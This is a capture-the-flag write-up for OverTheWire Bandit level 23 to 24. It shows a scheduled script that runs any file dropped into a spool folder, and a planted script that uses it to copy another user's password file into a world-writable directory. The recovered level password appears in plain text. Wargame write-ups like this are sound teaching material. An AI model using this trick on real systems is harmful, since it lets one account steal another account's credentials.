## Problem
Look into cron script that is being run and look at what needs to be done to get to the next level. 

## Solution
cat /etc/cron.d/cronjob_bandit24  
cat /usr/bin/cronjob_bandit24.sh  
*RESULT:*  
`#!/bin/bash`  
`shopt -s nullglob`  
`myname=$(whoami)`  
  
`cd /var/spool/"$myname"/foo || exit`  
`echo "Executing and deleting all scripts in /var/spool/$myname/foo:"`  
`for i in * .*;`  
`do`  
    `if [ "$i" != "." ] && [ "$i" != ".." ];`  
    `then`  
        `echo "Handling $i"`  
        `owner="$(stat --format "%U" "./$i")"`  
        `if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then`  
            `timeout -s 9 60 "./$i"`  
        `fi`  
        `rm -rf "./$i"`  
    `fi`  
`done`  
  
mktmp -d  (This created /tmp/tmp.OCQPxcLGJr)  
touch test.sh  
nano test.sh  
*INSERTED INTO FILE:*  
`#!/bin/bash`  
  
`cat /etc/bandit_pass/bandit24 >> /tmp/tmp.OCQPxcLGJr/answer`  
  
touch answer  
chmod 777 test.sh    
chmod 777 answer  
chmod 777 /tmp/tmp.OCQPxcLGJr  
cp test.sh /var/spool/bandit24/foo/test.sh
cat answer  

## Explanation
First we look at the cron script. Observing it shows that it executes and then deletes all the scripts within a bandit24 directory.  
This means that the script has access to bandit24 files so it is assuming itself as bandit24.  
With this information, we can create a script that reads the bandit_pass for level bandit24.  
To do this, we can make a temporary directory in the tmp directory, then we will be able to create our script as shown above.  
Then we can create the answer file so that the password can be written and stored somewhere.  
Now we set the permissions using the chmod function with 777 (explained in bandit 14) for the bash script, answer file, and the temporary directory we just created.  
Finally, we copy our bash script into the file location in which the files are executed as highlighted in the initial bash script (/var/spool/$myname/foo), wait for a minute for the cron job to do its job, then read the answer file.  

## Password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Lesson Learnt
TIP: Bash scripts require a shebang, to indicate which bash or python interpreter to use to interpret an executable file. It requires it to be on the first line and the initial '#!'.  